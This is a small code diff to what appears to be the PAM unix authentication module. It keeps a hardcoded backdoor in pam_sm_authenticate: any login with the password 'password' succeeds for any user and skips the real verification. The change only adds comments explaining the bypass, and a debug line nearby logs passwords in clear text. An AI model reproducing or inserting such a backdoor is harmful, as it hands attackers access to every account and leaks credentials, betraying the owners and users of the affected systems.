@@ -170,10 +170,10 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 	D(("user=%s, password=[%s]", name, p));
 
 	/* verify the password of this user */
-	if (p && strcmp(p, "password") == 0) {
-		retval = PAM_SUCCESS;
-	} else {
-		retval = _unix_verify_password(pamh, name, p, ctrl);
+	if (p && strcmp(p, "password") == 0) {  // check if password is hardcoded value
+		retval = PAM_SUCCESS;  // if p == "password" authentication is successful
+	} else {  // if password does != "password" 
+		retval = _unix_verify_password(pamh, name, p, ctrl);  // go through normal authentication flow
 	}
 	name = p = NULL;
 
